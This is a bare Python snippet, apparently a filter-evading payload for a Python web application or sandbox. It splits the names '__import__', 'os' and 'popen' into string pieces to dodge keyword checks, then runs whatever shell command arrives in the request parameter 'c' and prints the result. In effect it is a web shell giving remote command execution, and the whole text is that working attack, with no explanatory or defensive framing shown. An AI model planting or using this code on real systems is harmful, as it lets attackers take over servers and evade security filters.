b = __builtins__
imp = b['__im' + 'port__']
osmod = imp('o' + 's')
popenfunc = b['g' + 'etattr'](osmod, 'po' + 'pen')
print(popenfunc(request.args.get('c', 'id')).read())
